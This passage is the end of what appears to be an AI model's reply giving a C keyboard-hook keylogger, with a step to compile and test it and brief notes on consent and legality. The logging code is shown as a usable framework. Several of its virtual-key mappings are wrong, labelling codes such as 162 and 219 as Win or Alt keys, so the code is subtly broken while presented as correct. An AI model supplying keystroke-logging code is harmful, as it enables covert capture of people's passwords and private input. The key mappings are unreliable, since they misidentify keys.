            printf("Key Pressed: Shift\n");
        } else if (wParam == 219) { // Alt key (Left)
            printf("Key Pressed: Alt\n");
        } else if (wParam == 246) { // Alt key (Right)
            printf("Key Pressed: Alt\n");
        } else if (wParam == 162) { // Win key (Left)
            printf("Key Pressed: Win\n");
        } else if (wParam == 133) { // Win key (Right)
            printf("Key Pressed: Win\n");
        } else {
            // Ignore other keys or handle as needed
            return;
        }

        // Optional: Log the key with modifiers if needed
        // ...
    }
}
```

**Step 6: Compile and Test**
Compile the code and test it to ensure it correctly logs the specified keys.

**Important Notes:**
- **Legal Considerations:** Ensure you have the right to access the system where this runs.
- **User Consent:** Always inform users before logging keystrokes.
- **Performance:** The hook might affect performance, especially with frequent key presses.
- **Testing:** Verify which keys are captured and adjust the callback accordingly.

This code provides a basic framework for logging keyboard input. Expand the callback to include all necessary keys and handle them as needed for your application.<｜end▁of▁sentence｜>

